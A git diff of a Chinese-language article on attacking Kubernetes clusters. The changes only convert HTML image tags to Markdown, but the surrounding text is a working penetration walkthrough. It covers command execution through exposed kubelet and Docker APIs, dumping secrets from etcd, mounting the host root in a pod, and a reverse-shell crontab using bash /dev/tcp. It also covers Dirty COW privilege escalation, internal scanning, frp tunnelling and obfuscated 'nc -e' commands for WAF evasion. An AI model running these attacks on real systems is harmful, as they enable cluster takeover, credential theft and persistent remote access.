@@ -5,8 +5,7 @@ Kubernetes是一个开源的，用于编排云平台中多个主机上的容器�
 
 常见的Kubernetes集群结构图如下，Master节点是集群的控制节点，Node节点则是集群的工作节点。
 
-<div align="center"><img src="https://i.imgur.com/o8Li0GD.png" width = "700" height = "335"  align=center /></div>
-
+![](https://i.imgur.com/o8Li0GD.png)
 
 
 ## 1. Master节点
@@ -46,8 +45,7 @@ Pod是Kubernetes最重要也是最基本的概念，一个Pod是一组共享网�
 
 Pod的共享上下文，实际上是一组由namespace、cgroups, 其他资源的隔离的集合，意味着Pod中的资源已经是被隔离过了的，而在Pod中的每一个独立的container又对Pod中的资源进行了二次隔离。
 
-<div align="center"><img src="https://i.imgur.com/OnDjtUn.png" width = "380" height = "390"  align=center /></div>
-
+![](https://i.imgur.com/OnDjtUn.png)
 
 ### Service
 Kubernetes Service 定义了这样一种抽象：一个 Pod 的逻辑分组，一种可以访问它们的策略，通常称为微服务。 这一组Pod能够被Service访问到，通常是通过Label Selector实现的。
@@ -77,8 +75,8 @@ Deployment典型应用场景：
 ## 4. 运行流程
 
 创建pod的基本流程如下：
-<div align="center"><img src="https://i.imgur.com/lYsm6Kp.png" width = "700" height = "390"  align=center /></div>
 
+![](https://i.imgur.com/lYsm6Kp.png)
 
 1. 用户提交创建Pod的请求，可以通过API Server的REST API ，也可用Kubectl命令行工具，支持Json和Yaml两种格式；
 2. API Server处理用户请求，存储Pod数据到etcd；
@@ -106,8 +104,7 @@ ServiceAccount 主要包含了三个内容：namespace、Token 和 CA。namespac
 
 在RBAC API中，角色包含代表权限集合的规则。在这里，权限只有被授予，而没有被拒绝的设置。在Kubernetes中有两类角色，即普通角色和集群角色。可以通过Role定义在一个命名空间中的角色，或者可以使用ClusterRole定义集群范围的角色。一个角色只能被用来授予访问单一命令空间中的资源。
 
-<div align="center"><img src="https://i.imgur.com/EwdsaiS.png" width = "700" height = "335"  align=center /></div>
-
+![](https://i.imgur.com/EwdsaiS.png)
 
 ## 3. Keystone Password 认证
 Keystone 是 openstack 提供的认证和授权组件，这个方法对于已经使用 openstack 来搭建 Iaas 平台的公司比较适用，直接使用 keystone 可以保证 Iaas 和 Caas 平台保持一致的用户体系。
@@ -139,17 +136,16 @@ Keystone 是 openstack 提供的认证和授权组件，这个方法对于已经
 
 访问Rest API,会返回可用的API列表，如下所示：
 
-<div align="center"><img src="https://i.imgur.com/qPWlc8c.png" width = "450" height = "580"  align=center /></div>
+![](https://i.imgur.com/qPWlc8c.png)
 
 如果Kubernetes API Server配置了Dashboard,通过路径/ui即可访问
-<div align="center"><img src="https://i.imgur.com/h4K9SAZ.png" width = "700" height = "300"  align=center /></div>
+![](https://i.imgur.com/h4K9SAZ.png)
 
 该操作界面可以创建、修改、删除容器，查看日志等。我们可以编写yaml文件，构造pod来获取命令执行。如下提供了三种部署pod的方式
-<div align="center"><img src="https://i.imgur.com/EU0Fnld.png" width = "700" height = "335"  align=center /></div>
+![](https://i.imgur.com/EU0Fnld.png)
 
 输入文本创建一个pod，将节点的根目录挂载到容器的/mnt目录。获取到宿主机权限
-<div align="center"><img src="https://i.imgur.com/Uci3Jxh.png" width = "700" height = "400"  align=center /></div>
-
+![](https://i.imgur.com/Uci3Jxh.png)
 
 创建pod过程中，同样可命令执行反弹shell
 
@@ -173,12 +169,15 @@ Keystone 是 openstack 提供的认证和授权组件，这个方法对于已经
           type: Directory
 
 进入容器组，打开命令执行窗口
-<div align="center"><img src="https://i.imgur.com/2oYDIyb.png" width = "500" height = "240"  align=center /></div>
-<div align="center"><img src="https://i.imgur.com/tJOMckB.png" width = "500" height = "240"  align=center /></div>
+
+![](https://i.imgur.com/2oYDIyb.png)
+
+![](https://i.imgur.com/tJOMckB.png)
+
 
 
 Kubernetes官方提供了一个命令行工具kubectl。使用kubectl同样可以获取容器的shell，完成命令执行。并且可进入指定的容器执行命令
-<div align="center"><img src="https://i.imgur.com/xZBJXVq.png" width = "500" height = "180"  align=center /></div>
+![](https://i.imgur.com/xZBJXVq.png)
 
 
 如果在kubelet进程启动时加--enable-debugging-handles=true参数，那么kubernetes Proxy API还会增加以下接口：
@@ -204,7 +203,7 @@ Kubernetes官方提供了一个命令行工具kubectl。使用kubectl同样可�
 ## 2. etcd
 
 通常etcd数据库会被安装到master节点上，rest api可获取集群内token、证书、账户密码等敏感信息，默认端口为2379。访问路径/v2/keys/?recursive=true，以JSON格式返回存储在服务器上的所有密钥。部分结果如下：
-<div align="center"><img src="https://i.imgur.com/jYTIlOP.png" width = "700" height = "200"  align=center /></div>
+![](https://i.imgur.com/jYTIlOP.png)
 
 
 安装etcdctl，可以使用类似的方式查询API
@@ -212,7 +211,8 @@ Kubernetes官方提供了一个命令行工具kubectl。使用kubectl同样可�
 
     etcdctl --endpoint=http://[etcd_server_ip]:2379 ls
 
-<div align="center"><img src="https://i.imgur.com/kIRKBVE.png" width = "700" height = "80"  align=center /></div>
+
+![](https://i.imgur.com/kIRKBVE.png)
 
 若存在路径/registry/secrets/default，其中可能包含对集群提升权限的默认服务令牌。
 
@@ -229,17 +229,19 @@ kubelet 的主要功能就是定时从某个地方获取节点上 pod/container 
 
 
 10250端口是kubelet API的HTTPS端口，通过路径/pods获取环境变量、运行的容器信息、命名空间等信息。如下所示：
-<div align="center"><img src="https://i.imgur.com/7Egw5zi.png" width = "700" height = "450"  align=center /></div>
+![](https://i.imgur.com/7Egw5zi.png)
+
 
 获取到namespace、pod、container的信息后，执行如下请求。实现命令执行
 
     curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://kube-node-here:10250/exec/<namespace>/<podname>/<container-name>?command=touch&command=hello_world&input=1&output=1&tty=1"
 
 本地搭建测试环境进行复现，从返回结果中得到websocket地址
-<div align="center"><img src="https://i.imgur.com/Fez8EgB.png" width = "650" height = "180"  align=center /></div>
+![](https://i.imgur.com/Fez8EgB.png)
 
 采用wscat进行websocket连接。wscat是一个用来连接websocket的命令行工具，由nodejs开发，通过npm进行安装 `npm install -g wscat`
-<div align="center"><img src="https://i.imgur.com/8iZVogm.png" width = "680" height = "130"  align=center /></div>
+![](https://i.imgur.com/8iZVogm.png)
+
 
 ## 4. Docker Engine
 
@@ -247,13 +249,14 @@ kubelet 的主要功能就是定时从某个地方获取节点上 pod/container 
 kubernetes的容器编排技术进行管理构成的docker集群，kubernetes是google开源的容器管理系统，实现基于Docker构建容器，利用kubernetes可以很方便的管理含有多台Docker主机中的容器，将多个docker主机抽象为一个资源，以集群方式管理容器。
 
 当docker配置了Rest api,我们可以通过路径/containers/json 获取服务器主机当前运行的container列表。找到存在未授权访问的目标主机，发现已经被安装门罗币矿机。如下图所示：
-<div align="center"><img src="https://i.imgur.com/Ofkg3AC.png" width = "700" height = "390"  align=center /></div>
+![](https://i.imgur.com/Ofkg3AC.png)
 
 通过远程访问接口，获得容器访问权限。启动容器时通过挂载根目录到容器内的目录，获取宿主机权限。输入如下指令，获取容器操作权限
 
     docker -H tcp://xxx.xxx.xxx.xxx:2375 run -it -v /root/.ssh/:/mnt alpine /bin/sh
 
-<div align="center"><img src="https://i.imgur.com/xM7kvvV.png" width = "700" height = "280"  align=center /></div>
+
+![](https://i.imgur.com/xM7kvvV.png)
 
 为实现对宿主机的控制，使用方法如下：
 
@@ -275,7 +278,8 @@ kubernetes的容器编排技术进行管理构成的docker集群，kubernetes是
 
 
 执行./dirty 密码命令，即可进行提权。获取username和password，输入su username获取root权限
-<div align="center"><img src="https://i.imgur.com/lBdmN5w.png" width = "700" height = "240"  align=center /></div>
+![](https://i.imgur.com/lBdmN5w.png)
+
 
 ## 5. 认证与授权
 
@@ -283,7 +287,8 @@ kubernetes的容器编排技术进行管理构成的docker集群，kubernetes是
 Service Account 概念的引入是基于这样的使用场景：运行在 Pod 里的进程需要调用 Kubernetes API 以及非 Kubernetes API 的其它服务（如 image repository/被 mount 到 Pod 上的 NFS volumes 中的 file 等）。
 
 Kubernetes 默认会挂载 /run/secrets/kubernetes.io/serviceaccount/token 到各个 Pod 里，但这样会导致攻击者进入容器后读取 token 就能和 Kubernetes API 通信了。如果Kubernetes增加了RBAC授权，可能无法使用token进行通信。
-<div align="center"><img src="https://i.imgur.com/N3OaEK5.png" width = "700" height = "190"  align=center /></div>
+![](https://i.imgur.com/N3OaEK5.png)
+
 
 # 四、kubernetes 基本使用
 
@@ -782,7 +787,7 @@ Flannel使用Etcd进行配置，来保证多个Flannel实例之间的配置一�
     systemctl status kube-proxy
 	systemctl status docker
 
-<div align="center"><img src="https://i.imgur.com/KodBwb4.png" width = "700" height = "100"  align=center /></div>
+![](https://i.imgur.com/KodBwb4.png)
 
 大部分情况下，报错需要重新启动。或者是由于配置文件的格式错误，具体错误在命令后加 -l 
 
@@ -845,10 +850,10 @@ Spring Data是一个用于简化数据库访问，并支持云服务的开源框
     kubectl create -f vul-sr.yaml
 
 创建完成后，执行 `kubectl get services` 可以看到成功映射端口
-<div align="center"><img src="https://i.imgur.com/9UDWvQD.png" width = "700" height = "80"  align=center /></div>
+![](https://i.imgur.com/9UDWvQD.png)
 
 接着回到node节点主机，关闭防火墙。仍然存在外部无法访问应用的情况，执行命令 `iptables -P FORWARD ACCEPT`
-<div align="center"><img src="https://i.imgur.com/wFHI09h.png" width = "700" height = "400"  align=center /></div>
+![](https://i.imgur.com/wFHI09h.png)
 
 
 ## 2. 漏洞利用获取权限
@@ -866,17 +871,19 @@ bash -i >& /dev/tcp/ip/port 0>&1
 
 下载脚本文件至目标主机，测试过程中，发现目标测试环境无法解析域名。这个问题需修改 `kubelet` 配置文件中 `KUBELET_DNS_IP`为公网DNS `8.8.8.8`。但本次测试决定使用域名无法解析的环境。
 在服务器上执行 `python -m SimpleHTTPServer 10888` 通过python临时开启http服务下载文件
-<div align="center"><img src="https://i.imgur.com/ecbFt42.png" width = "700" height = "350"  align=center /></div>
+![](https://i.imgur.com/ecbFt42.png)
 
 接着执行该文件，获取shell
 
-<div align="center"><img src="https://i.imgur.com/3aGcNCo.png" width = "600" height = "180"  align=center /></div>
 
-<div align="center"><img src="https://i.imgur.com/pyCrwTV.png" width = "600" height = "235"  align=center /></div>
+![](https://i.imgur.com/3aGcNCo.png)
+
+![](https://i.imgur.com/pyCrwTV.png)
 
 ## 3. 攻击集群组件
 输入指令 env，获取到当前容器信息。只有Deployment的IP，没有node节点的信息
-<div align="center"><img src="https://i.imgur.com/X6Z4vmc.png" width = "600" height = "435"  align=center /></div>
+
+![](https://i.imgur.com/X6Z4vmc.png)
 
 集群的组件中可利用的默认端口如下：
 
@@ -919,11 +926,11 @@ done
 对A类地址的C段进行扫描对比，结果如下：
 
 执行脚本 time sh shell.sh 10.0  ,耗费了13min41s
-<div align="center"><img src="https://i.imgur.com/AAnAfvW.png" width = "400" height = "235"  align=center /></div>
+![](https://i.imgur.com/AAnAfvW.png)
 
 使用nmap对存活主机探测，调整并行扫描组及探测报文并行度为最小，通过ICMP echo判定主机是否存活。执行命令及结果如下：
 `nmap 10.0.0.1/16 -sn -PE --min-hostgroup 1024 --min-parallelism 1024 -oG ip_scan.txt`
-<div align="center"><img src="https://i.imgur.com/MFYZxqD.png" width = "600" height = "250"  align=center /></div>
+![](https://i.imgur.com/MFYZxqD.png)
 
 对比结果，nmap可以更快的实现对存活主机的探测。
 
@@ -954,7 +961,7 @@ do
 done
 ```
 简单测试结果如下：
-<div align="center"><img src="https://i.imgur.com/VcymRqG.png" width = "370" height = "270"  align=center /></div>
+![](https://i.imgur.com/VcymRqG.png)
 
 
 3. 在对A类网段探测过程中，发现有多个主机存在集群组件的默认端口。内网中开放了K8S API服务,且可以未授权访问。下载kubectl，对K8S API进行操作。访问 `https://dl.k8s.io/v1.9.3/kubernetes-client-linux-amd64.tar.gz` 下载文件至于服务器上，使用python开放http服务提供下载。执行如下命令：
@@ -968,7 +975,8 @@ done
     mv ./kubectl /usr/local/bin/kubectl
 
 运行 kubectl version，返回版本信息，说明安装成功
-<div align="center"><img src="https://i.imgur.com/3hOUoNM.png" width = "700" height = "135"  align=center /></div>
+![](https://i.imgur.com/3hOUoNM.png)
+
 
 4. 通过kubectl创建pod并挂载根目录,执行反弹shell命令。yaml文件内容如下：
 
@@ -993,7 +1001,8 @@ done
           type: Directory
 
 服务端开启监听，执行命令 `kubectl -s http://10.0.xxx.xxx:8080/ create -f vul.yaml` 。进入/mnt目录，可以看到获取了宿主机权限。但由于根目录位于/mnt下，与当前环境变量冲突，部分工具无法使用。
-<div align="center"><img src="https://i.imgur.com/q6fXxOS.png" width = "500" height = "335"  align=center /></div>
+![](https://i.imgur.com/q6fXxOS.png)
+
 
 5. 向容器的 /mnt/etc/crontab 写入反弹 shell 的定时任务，因为创建容器时把宿主机的根目录挂载到了容器的/mnt 目录下，所以可以直接影响到宿主机的 crontab。
 
@@ -1001,7 +1010,7 @@ done
     echo -e "* * * * * root bash -i >& /dev/tcp/ip/port 0>&1\n" >> /mnt/etc/crontab
 
 在服务端开启端口监听，等待一段时候后获取shell，shell的主机名为宿主机
-<div align="center"><img src="https://i.imgur.com/O2wEqtl.png" width = "500" height = "135"  align=center /></div>
+![](https://i.imgur.com/O2wEqtl.png)
 
 
 ## 4. 渗透分析
@@ -1016,7 +1025,8 @@ frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp
 https://github.com/fatedier/frp/releases
 
 在公网服务器上修改 frps.ini 文件，默认端口7000，可更改绑定端口。通过`./frps -c ./frps.ini` 启动，在公网监听7000。
-<div align="center"><img src="https://i.imgur.com/ythjhYf.png" width = "700" height = "235"  align=center /></div>
+![](https://i.imgur.com/ythjhYf.png)
+
 
 在内网主机上，增加配置如下：
     
@@ -1033,11 +1043,10 @@ https://github.com/fatedier/frp/releases
     plugin_http_passwd = abcd
 
 通过 `./frpc -c ./frpc.ini`启动客户端
-<div align="center"><img src="https://i.imgur.com/GIkXGyU.png" width = "600" height = "90"  align=center /></div>
+![](https://i.imgur.com/GIkXGyU.png)
 
 在浏览器中，使用SwitchyOmega配置公网IP及代理端口6004，输入账号和密码。使用代理实现对内网服务器主机的访问,前提是不和客户端在同一出口IP下
-<div align="center"><img src="https://i.imgur.com/ZJG1H2u.png" width = "600" height = "190"  align=center /></div>
-
+![](https://i.imgur.com/ZJG1H2u.png)
 
 
 ### 4.2 内网命令执行绕过
@@ -1048,7 +1057,7 @@ https://github.com/fatedier/frp/releases
     C:\>powershell C:\*\*2\n??e*d.* notepad
     C:\>powershell C:\*\*2\t?s*r.* taskmgr
 
-<div align="center"><img src="https://i.imgur.com/NusnDUI.png" width = "700" height = "335"  align=center /></div>
+![](https://i.imgur.com/NusnDUI.png)
 
 linux 环境下命令执行，绕过方式如下：
 
@@ -1058,14 +1067,14 @@ linux 环境下命令执行，绕过方式如下：
 	/??'?'/?at /???/????w?
  	
 
-<div align="center"><img src="https://i.imgur.com/m7C54V6.png" width = "700" height = "335"  align=center /></div>
+![](https://i.imgur.com/m7C54V6.png)
 
 通过NetCat命令执行反弹shell 
 
     nc -e /bin/bash 127.0.0.1 1337
     /???/?c.??????????? -e /???/b??h 2130706433 1337
 
-<div align="center"><img src="https://i.imgur.com/KpLrYr7.png" width = "700" height = "235"  align=center /></div>
+![](https://i.imgur.com/KpLrYr7.png)
 
 更多命令的绕过方式可参考如下文章`https://medium.com/secjuice/waf-evasion-techniques-718026d693d8`
 
@@ -1083,7 +1092,8 @@ linux 环境下命令执行，绕过方式如下：
     curl -k -XPOST "https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq" -d "cmd=env"
 
 查看返回内容中的KUBLET_CERT，KUBLET_KEY和CA_CERT环境变量
-<div align="center"><img src="https://i.imgur.com/8FwpvUQ.png" width = "700" height = "235"  align=center /></div>
+![](https://i.imgur.com/8FwpvUQ.png)
+
 
 在获取到认证信息后，需要在 `env` 中找到kubernetes API server。并非开放了10250端口的主机
 
